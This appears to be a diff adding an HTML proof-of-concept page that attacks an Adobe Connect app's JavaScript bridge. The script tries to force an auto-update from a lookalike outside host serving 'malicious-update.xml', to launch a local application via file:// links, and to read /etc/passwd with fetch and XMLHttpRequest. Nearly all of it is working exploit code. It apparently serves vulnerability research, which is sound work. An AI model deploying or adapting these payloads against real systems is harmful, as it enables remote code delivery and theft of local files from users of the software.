@@ -1,0 +1,47 @@
+<html><body>
+<div id="o"></div>
+<script>
+var o = document.getElementById('o');
+function log(m) { o.innerHTML += m + '<br>'; }
+
+// APPROACH 1: checkForUpdates with bAutoUpdate=true (3rd parameter)
+// The JS signature is: checkForUpdates(updateXmlUrl, informIfNone, bAutoUpdate)
+// Maybe bAutoUpdate=true forces the download without user prompt
+try {
+    log('checkForUpdates with bAutoUpdate=true...');
+    connectApp.checkForUpdates('https://adobe-genuine.github.io/connect-poc/malicious-update.xml', false, true);
+    log('Done');
+} catch(e) { log('Error: ' + e.message); }
+
+// APPROACH 2: Try to use window.open to spawn a process
+try {
+    log('window.open file:// ...');
+    window.open('file:///Applications/Calculator.app');
+} catch(e) { log('Error: ' + e.message); }
+
+// APPROACH 3: Create a link and click it programmatically
+try {
+    log('Programmatic link click...');
+    var a = document.createElement('a');
+    a.href = 'file:///Applications/Calculator.app';
+    a.click();
+} catch(e) { log('Error: ' + e.message); }
+
+// APPROACH 4: Try fetch to local file and see if we get content
+try {
+    log('fetch file:///etc/passwd ...');
+    fetch('file:///etc/passwd').then(function(r){return r.text();}).then(function(t){log('FILE READ: '+t.substring(0,200));}).catch(function(e){log('fetch err: '+e);});
+} catch(e) { log('Error: ' + e.message); }
+
+// APPROACH 5: Try XMLHttpRequest to file://
+try {
+    log('XHR file:///etc/passwd ...');
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'file:///etc/passwd', true);
+    xhr.onload = function() { log('XHR READ: ' + xhr.responseText.substring(0,200)); };
+    xhr.onerror = function() { log('XHR error'); };
+    xhr.send();
+} catch(e) { log('Error: ' + e.message); }
+
+</script>
+</body></html>
